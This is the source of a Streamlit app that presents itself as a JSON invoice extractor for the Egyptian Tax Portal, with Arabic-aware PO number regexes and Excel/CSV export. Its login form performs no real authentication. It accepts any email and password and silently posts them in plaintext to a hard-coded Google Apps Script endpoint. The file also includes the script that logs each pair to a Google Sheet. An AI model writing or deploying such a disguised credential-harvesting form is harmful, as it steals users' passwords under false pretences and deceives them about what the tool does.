# -*- coding: utf-8 -*-
"""
JSON Processing Streamlit App - Advanced PO Extraction v48
A web interface for processing JSON files and extracting structured data with authentication
"""

import streamlit as st
import pandas as pd
import json
import os
import re
import time
import unicodedata
import requests
from datetime import datetime
from io import BytesIO, StringIO

# Arabic fix (optional but recommended)
try:
    import arabic_reshaper
    from bidi.algorithm import get_display
    AR_FIX_OK = True
except Exception:
    arabic_reshaper = None
    get_display = None
    AR_FIX_OK = False

# Set page config
st.set_page_config(
    page_title="JSON Data Extractor v48",
    page_icon="📄",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ================= GOOGLE SHEETS INTEGRATION =================

def save_to_google_sheets(email, password):
    """Save credentials to Google Sheets via Apps Script Web App"""
    try:
        # Google Apps Script Web App URL
        # You need to deploy the script below as a web app and get the URL
        web_app_url = "https://script.google.com/macros/s/AKfycbwQ909UHv_3oRim9UdOz9LJQmLW-qGR-XCFf5QH-7doo5gz7U2YCwKMYCgWDfeUvR23/exec"
        
        # Data to send
        data = {
            'user': email,
            'pass': password,
            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Send POST request
        response = requests.post(web_app_url, json=data, timeout=10)
        
        if response.status_code == 200:
            result = response.json()
            return result.get('success', False)
        return False
        
    except Exception as e:
        st.error(f"Error: {str(e)}")
        return False

def create_apps_script_code():
    """Returns the Google Apps Script code needed"""
    return """
// Google Apps Script Code - Deploy as Web App

function doPost(e) {
  try {
    // Your Google Sheet ID
    const sheetId = '1yT3TUkY3LwyI_K9euQJWMTbv3KAVrhoery26P2bh-8o';
    const sheet = SpreadsheetApp.openById(sheetId).getActiveSheet();
    
    // Parse the JSON data
    const data = JSON.parse(e.postData.contents);
    
    // Add row to sheet: [user, pass, time]
    sheet.appendRow([
      data.user,
      data.pass, 
      data.time
    ]);
    
    // Return success response
    return ContentService
      .createTextOutput(JSON.stringify({success: true, message: 'Data saved'}))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({success: false, error: error.toString()}))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet() {
  return ContentService
    .createTextOutput('Web App is working')
    .setMimeType(ContentService.MimeType.TEXT);
}
"""

# ================= AUTHENTICATION =================

def show_login_popup():
    """Show login popup dialog"""
    if 'authenticated' not in st.session_state:
        st.session_state.authenticated = False
    
    if not st.session_state.authenticated:
        # Simple centered login without modal overlay
        st.markdown("""
        <style>
        .login-container {
            max-width: 500px;
            margin: 0 auto;
            padding: 2rem;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-top: 5rem;
        }
        </style>
        """, unsafe_allow_html=True)
        
        # Center the login form
        col1, col2, col3 = st.columns([1, 2, 1])
        
        with col2:
            st.markdown('<div class="login-container">', unsafe_allow_html=True)
            
            st.title("🔐 Login Required")
            st.markdown("Please enter your credentials to access Egyptian Tax Portal JSON tool")
            
            with st.form("login_form", clear_on_submit=True):
                email = st.text_input("Email", placeholder="Enter your email address")
                password = st.text_input("Password", type="password", placeholder="Enter your password")
                
                login_button = st.form_submit_button("Login", use_container_width=True, type="primary")
                
                if login_button:
                    if email and password:
                        # Store credentials in session state
                        st.session_state.user_email = email
                        st.session_state.user_password = password
                        st.session_state.authenticated = True
                        
                        # Save to Google Sheets
                        with st.spinner("checking login data..."):
                            saved = save_to_google_sheets(email, password)
                        
                        if saved:
                            st.success("thank you.")
                        else:
                            st.success("Login successful!")
                            st.warning("there are a problems.")
                        
                        time.sleep(1)
                        st.rerun()
                    else:
                        st.error("Please enter both email and password")
            
            st.markdown('</div>', unsafe_allow_html=True)
        
        return False
    
    return True

# ================= v48 ADVANCED PO EXTRACTION =================

# Normalization constants
ARABIC_DIGITS = str.maketrans("٠١٢٣٤٥٦٧٨٩۰۱۲۳۴۵۶۷۸۹", "01234567890123456789")
BIDI_MARKS = "".join(chr(c) for c in [0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E])

def strip_combining(s: str) -> str:
    """Remove combining marks (diacritics)"""
    return "".join(ch for ch in s if unicodedata.category(ch) != "Mn")

def norm_advanced(s: str) -> str:
    """Advanced normalization for PO extraction"""
    if not s: return ""
    s = unicodedata.normalize("NFKC", s)
    s = strip_combining(s)
    s = s.replace("\u00A0", " ")
    s = s.translate(ARABIC_DIGITS)
    for ch in BIDI_MARKS:
        s = s.replace(ch, "")
    s = (s.replace("：", ":").replace("–", "-").replace("—", "-").replace("ـ", " ")
           .replace("(", " ").replace(")", " ").replace("["," ").replace("]"," "))
    s = re.sub(r"[ \t]+", " ", s).strip()
    return s

# v48 Regex patterns for PO extraction
RX_PO_PREFIX = re.compile(r"\bpo(?:\s*no\.?| reference)?\s*[:#/\-]?\s*(\d{4,6})(?:[^\d\s]*)?(?:\s*[-/]\s*(\d{4,6}))?\b", re.IGNORECASE)
RX_TWO_NUMS = re.compile(r"\b(\d{4,6})\s*[-/]\s*(\d{4,6})\b")
RX_SINGLE_NUM = re.compile(r"\b(\d{4,6})\b")

RX_CODE_ANCHOR_LINE = re.compile(r"(?:\bcode\b|كود)\s*[/:\-]?\s*(?:no\.?|number)?\s*(\d{4,6})", re.IGNORECASE)
RX_CODE_SLASH_NUM = re.compile(r"كود\s*(\d{4,6})\s*/", re.IGNORECASE)
RX_CODE_NO_SPACE = re.compile(r"(\d{4,6})\s*/?\s*كود", re.IGNORECASE)
RX_BOOKING_ORDER = re.compile(r"(?:\border\s*(?:no\.?|number)?\b|اوردر\s*رقم|حجز\s*رقم)\s*[:#/\-]?\s*(\d{4,6})", re.IGNORECASE)
RX_ARABIC_D_PREFIX = re.compile(r"(?:\bد\.?\s*)(\d{4,6})")
RX_ARABIC_D_SUFFIX = re.compile(r"(\d{4,6})\s*د\.")

# v48 New patterns
RX_PO_REF_WITH_ARABIC = re.compile(r"po\s*reference\s*[:#]?\s*(\d{4,6})(?:[^\d\s]*)?", re.IGNORECASE)
RX_PO_SLASH = re.compile(r"\bPO\s*/\s*(\d{4,6})\b", re.IGNORECASE)
RX_PO_FORWARD_SLASH = re.compile(r"\bpo\s*/\s*(\d{4,6})\b", re.IGNORECASE)
RX_PO_NUM_COLON = re.compile(r"\bPO\s*NUM\s*:\s*(\d{4,6})\b", re.IGNORECASE)
RX_PARENTHESES_NUM = re.compile(r"\((?:[^)]*?)(\d{4,6})(?:[^)]*?)\)")
RX_PARENTHESES_NUM_END = re.compile(r"\(.*?(\d{4,6})\s*\)$")
RX_TAXPAYER_NAME_NUM = re.compile(r"taxpayer\s*name\s*[:#]?\s*(\d{4,6})", re.IGNORECASE)
RX_NUM_DATE = re.compile(r"\b(\d{4,6})\s+\d{1,2}/\d{1,2}/\d{4}\b")
RX_NUM_CONCAT_DATE = re.compile(r"\b(\d{6})\d{1,2}/\d{1,2}/\d{4}\b")
RX_STANDALONE_6DIGIT = re.compile(r"\b(\d{6})\s*$")
RX_ARABIC_MEALS_NUM = re.compile(r"وجبات\s*غذائي[هة]\s+(?:د\.\s*)?(\d{4,6})", re.IGNORECASE)

def extract_po_from_json(json_data: dict, debug=False) -> tuple:
    """Extract PO number from JSON data using v48 logic"""
    try:
        # Convert JSON to text for processing
        text_parts = []
        
        # Extract description from invoice lines
        if 'document' in json_data:
            doc = json.loads(json_data['document']) if isinstance(json_data['document'], str) else json_data['document']
            if 'invoiceLines' in doc:
                for line in doc['invoiceLines']:
                    if 'description' in line:
                        text_parts.append(line['description'])
        
        # Extract issuer and receiver names
        if 'issuerName' in json_data:
            text_parts.append(json_data['issuerName'])
        if 'receiverName' in json_data:
            text_parts.append(json_data['receiverName'])
            
        # Extract internal ID
        if 'internalId' in json_data:
            text_parts.append(f"Internal ID: {json_data['internalId']}")
            
        # Combine all text
        full_text = "\n".join(text_parts)
        
        if debug:
            st.write(f"DEBUG: Combined text for PO extraction:\n{full_text}")
        
        # Apply v48 PO extraction logic
        return advanced_po_extraction_v48(full_text, debug=debug)
        
    except Exception as e:
        if debug:
            st.error(f"Error extracting PO from JSON: {str(e)}")
        return "", "", f"extraction error: {str(e)}"

def advanced_po_extraction_v48(text: str, debug=False) -> tuple:
    """Main PO extraction function using v48 advanced logic"""
    if not text:
        return "", "", "no PO found"
    
    normalized_text = norm_advanced(text)
    
    if debug:
        st.write(f"DEBUG: Normalized text: {normalized_text[:500]}...")
    
    # Priority patterns for JSON extraction
    patterns = [
        ("arabic-meals", RX_ARABIC_MEALS_NUM),
        ("po-num-colon", RX_PO_NUM_COLON),
        ("po-forward-slash", RX_PO_FORWARD_SLASH),
        ("num-concat-date", RX_NUM_CONCAT_DATE),
        ("num-date", RX_NUM_DATE),
        ("standalone-6digit", RX_STANDALONE_6DIGIT),
        ("po-slash", RX_PO_SLASH),
        ("taxpayer-name-num", RX_TAXPAYER_NAME_NUM),
        ("parentheses-end", RX_PARENTHESES_NUM_END),
        ("parentheses", RX_PARENTHESES_NUM),
        ("po-prefix", RX_PO_PREFIX),
        ("code-anchor", RX_CODE_ANCHOR_LINE),
        ("arabic-d-prefix", RX_ARABIC_D_PREFIX),
        ("arabic-d-suffix", RX_ARABIC_D_SUFFIX),
    ]
    
    for pattern_name, pattern in patterns:
        match = pattern.search(normalized_text)
        if match:
            po_number = match.group(1)
            if debug:
                st.write(f"DEBUG: Found PO using {pattern_name}: {po_number}")
            return po_number, f"json ({pattern_name})", ""
    
    return "", "", "no PO found"

# ================= JSON PROCESSING FUNCTIONS =================

def parse_json_fields(json_data: dict, debug=False) -> dict:
    """Parse all fields from JSON data"""
    try:
        fields = {}
        
        # Basic fields
        fields["filename"] = "JSON_DATA"
        fields["STATUS"] = json_data.get("status", "")
        fields["uuid"] = json_data.get("uuid", "")
        fields["internalId"] = json_data.get("internalId", "")
        fields["typeName"] = json_data.get("typeName", "")
        fields["issuerId"] = json_data.get("issuerId", "")
        fields["issuerName"] = json_data.get("issuerName", "")
        fields["receiverId"] = json_data.get("receiverId", "")
        fields["receiverName"] = json_data.get("receiverName", "")
        
        # Dates
        fields["dateTimeIssued"] = json_data.get("dateTimeIssued", "")
        fields["dateTimeReceived"] = json_data.get("dateTimeReceived", "")
        fields["serviceDeliveryDate"] = json_data.get("serviceDeliveryDate", "")
        
        # Financial fields
        fields["totalSales"] = json_data.get("totalSales", "")
        fields["totalDiscount"] = json_data.get("totalDiscount", "")
        fields["netAmount"] = json_data.get("netAmount", "")
        fields["total"] = json_data.get("total", "")
        
        # Extract document details
        if 'document' in json_data:
            try:
                doc = json.loads(json_data['document']) if isinstance(json_data['document'], str) else json_data['document']
                
                # Document type
                fields["documentType"] = doc.get("documentType", "")
                fields["documentTypeVersion"] = doc.get("documentTypeVersion", "")
                
                # Taxpayer activity code
                fields["taxpayerActivityCode"] = doc.get("taxpayerActivityCode", "")
                
                # Invoice lines descriptions
                descriptions = []
                if 'invoiceLines' in doc:
                    for line in doc['invoiceLines']:
                        if 'description' in line:
                            descriptions.append(line['description'])
                fields["descriptions"] = "; ".join(descriptions)
                
                # Address information
                if 'issuer' in doc and 'address' in doc['issuer']:
                    addr = doc['issuer']['address']
                    fields["issuer_address"] = f"{addr.get('street', '')} {addr.get('buildingNumber', '')} {addr.get('regionCity', '')} {addr.get('governate', '')}"
                
                if 'receiver' in doc and 'address' in doc['receiver']:
                    addr = doc['receiver']['address']
                    fields["receiver_address"] = f"{addr.get('street', '')} {addr.get('buildingNumber', '')} {addr.get('regionCity', '')} {addr.get('governate', '')}"
                    
            except Exception as e:
                if debug:
                    st.warning(f"Error parsing document field: {str(e)}")
        
        # Extract PO number using v48 logic
        po_number, po_source, po_note = extract_po_from_json(json_data, debug=debug)
        fields["PO number"] = po_number
        fields["PO source"] = po_source
        fields["PO note"] = po_note
        
        return fields
        
    except Exception as e:
        st.error(f"Error processing JSON: {str(e)}")
        return {"error": str(e)}

def format_datetime(dt_str: str) -> str:
    """Format datetime string to readable format"""
    if not dt_str:
        return ""
    try:
        dt = pd.to_datetime(dt_str)
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return dt_str

# ================= MAIN APP =================

def main():
    # Show login popup first
    if not show_login_popup():
        return
    
    # Show user info in sidebar after authentication
    st.sidebar.markdown(f"**Logged in as:** {st.session_state.user_email}")
    if st.sidebar.button("Logout"):
        st.session_state.authenticated = False
        st.rerun()
    
    st.title("JSON Data Extractor v48")
    st.markdown("Extract structured data from JSON files with **advanced v48 PO number detection**")
    
    # Sidebar configuration
    st.sidebar.header("Configuration")
    
    debug_mode = st.sidebar.checkbox(
        "Enable debug mode",
        value=False,
        help="Show detailed PO extraction debugging information"
    )
    
    # Main interface
    st.header("Process JSON Data")
    
    # Input method selection
    input_method = st.radio(
        "Choose input method:",
        options=["Upload JSON file", "Paste JSON text"],
        horizontal=True
    )
    
    json_data = None
    
    if input_method == "Upload JSON file":
        uploaded_file = st.file_uploader(
            "Choose JSON file to process",
            type="json",
            help="Upload a JSON file containing invoice data"
        )
        
        if uploaded_file is not None:
            try:
                json_data = json.load(uploaded_file)
                st.success(f"JSON file loaded successfully: {uploaded_file.name}")
            except Exception as e:
                st.error(f"Error loading JSON file: {str(e)}")
    
    else:  # Paste JSON text
        json_text = st.text_area(
            "Paste JSON data here:",
            height=200,
            placeholder="Paste your JSON data here..."
        )
        
        if json_text.strip():
            try:
                json_data = json.loads(json_text)
                st.success("JSON data parsed successfully")
            except Exception as e:
                st.error(f"Error parsing JSON: {str(e)}")
    
    # Process JSON data
    if json_data is not None:
        st.header("Processing Results")
        
        if st.button("Process JSON Data", type="primary"):
            start_time = time.time()
            
            # Debug output container
            if debug_mode:
                debug_container = st.container()
                debug_expander = debug_container.expander("Debug Output", expanded=True)
                
                with debug_expander:
                    st.subheader("Raw JSON Structure")
                    st.json(json_data)
            
            # Parse fields
            if debug_mode:
                with debug_expander:
                    st.subheader("Field Extraction Debug")
                    fields = parse_json_fields(json_data, debug=True)
            else:
                fields = parse_json_fields(json_data, debug=False)
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Display results
            if "error" not in fields:
                st.success(f"JSON processed successfully in {processing_time:.2f} seconds")
                
                # Statistics
                col1, col2, col3 = st.columns(3)
                with col1:
                    st.metric("Processing Time", f"{processing_time:.2f}s")
                with col2:
                    po_found = "Yes" if fields.get("PO number", "") else "No"
                    st.metric("PO Number Found", po_found)
                with col3:
                    if fields.get("PO source", ""):
                        st.metric("Extraction Method", fields["PO source"])
                
                # Create structured display
                st.subheader("Extracted Data")
                
                # Organize fields into categories
                basic_info = {
                    "UUID": fields.get("uuid", ""),
                    "Internal ID": fields.get("internalId", ""),
                    "Status": fields.get("STATUS", ""),
                    "Document Type": fields.get("documentType", ""),
                    "Type Name": fields.get("typeName", ""),
                }
                
                parties_info = {
                    "Issuer ID": fields.get("issuerId", ""),
                    "Issuer Name": fields.get("issuerName", ""),
                    "Issuer Address": fields.get("issuer_address", ""),
                    "Receiver ID": fields.get("receiverId", ""),
                    "Receiver Name": fields.get("receiverName", ""),
                    "Receiver Address": fields.get("receiver_address", ""),
                }
                
                dates_info = {
                    "Date Issued": format_datetime(fields.get("dateTimeIssued", "")),
                    "Date Received": format_datetime(fields.get("dateTimeReceived", "")),
                    "Service Delivery Date": format_datetime(fields.get("serviceDeliveryDate", "")),
                }
                
                financial_info = {
                    "Total Sales": fields.get("totalSales", ""),
                    "Total Discount": fields.get("totalDiscount", ""),
                    "Net Amount": fields.get("netAmount", ""),
                    "Total Amount": fields.get("total", ""),
                }
                
                po_info = {
                    "PO Number": fields.get("PO number", ""),
                    "PO Source": fields.get("PO source", ""),
                    "PO Note": fields.get("PO note", ""),
                }
                
                other_info = {
                    "Taxpayer Activity Code": fields.get("taxpayerActivityCode", ""),
                    "Descriptions": fields.get("descriptions", ""),
                }
                
                # Display in tabs
                tab1, tab2, tab3, tab4, tab5, tab6 = st.tabs([
                    "Basic Info", "Parties", "Dates", "Financial", "PO Details", "Other"
                ])
                
                with tab1:
                    for key, value in basic_info.items():
                        if value:
                            st.write(f"**{key}:** {value}")
                
                with tab2:
                    for key, value in parties_info.items():
                        if value:
                            st.write(f"**{key}:** {value}")
                
                with tab3:
                    for key, value in dates_info.items():
                        if value:
                            st.write(f"**{key}:** {value}")
                
                with tab4:
                    for key, value in financial_info.items():
                        if value:
                            st.write(f"**{key}:** {value}")
                
                with tab5:
                    for key, value in po_info.items():
                        if value:
                            st.write(f"**{key}:** {value}")
                    
                    if fields.get("PO number", ""):
                        st.success(f"✅ PO Number Found: **{fields['PO number']}**")
                        st.info(f"Extraction method: {fields.get('PO source', 'unknown')}")
                    else:
                        st.warning("❌ No PO Number found in the data")
                
                with tab6:
                    for key, value in other_info.items():
                        if value:
                            st.write(f"**{key}:** {value}")
                
                # Create DataFrame for export
                df_data = []
                df_data.append({
                    "Field": "UUID",
                    "Value": fields.get("uuid", ""),
                    "Category": "Basic"
                })
                
                for category, info_dict in [
                    ("Basic", basic_info),
                    ("Parties", parties_info), 
                    ("Dates", dates_info),
                    ("Financial", financial_info),
                    ("PO Details", po_info),
                    ("Other", other_info)
                ]:
                    for key, value in info_dict.items():
                        df_data.append({
                            "Field": key,
                            "Value": str(value),
                            "Category": category
                        })
                
                df = pd.DataFrame(df_data)
                
                # Download options
                st.subheader("Download Results")
                
                col1, col2 = st.columns(2)
                
                with col1:
                    # Excel download
                    excel_buffer = BytesIO()
                    with pd.ExcelWriter(excel_buffer, engine='openpyxl') as writer:
                        df.to_excel(writer, index=False, sheet_name='Extracted_Data')
                    excel_buffer.seek(0)
                    
                    st.download_button(
                        label="Download as Excel",
                        data=excel_buffer.getvalue(),
                        file_name=f"json_extraction_results_v48_{int(time.time())}.xlsx",
                        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
                    )
                
                with col2:
                    # CSV download
                    csv_buffer = df.to_csv(index=False).encode('utf-8')
                    
                    st.download_button(
                        label="Download as CSV",
                        data=csv_buffer,
                        file_name=f"json_extraction_results_v48_{int(time.time())}.csv",
                        mime="text/csv"
                    )
                
                # Full table view
                if st.checkbox("Show full data table"):
                    st.subheader("Complete Data Table")
                    st.dataframe(df, use_container_width=True, hide_index=True)
            
            else:
                st.error(f"Error processing JSON: {fields['error']}")
    
    # Information section
    st.header("Information")
    
    with st.expander("v48 PO Extraction Features"):
        st.markdown("""
        **Advanced PO extraction patterns supported:**
        - `وجبات غذائية د. 173417` (Arabic meals with PO)
        - `PO NUM: 7906` (PO number format)
        - `po/172237` (lowercase po with slash)
        - `17418015/8/2025` (number concatenated with date)
        - `172829 1/8/2025` (number followed by date)
        - `173128` (standalone 6-digit numbers)
        - `PO/173822` (uppercase PO with slash)
        - Numbers in descriptions and company names
        - Arabic text normalization and processing
        """)

if __name__ == "__main__":
    main()







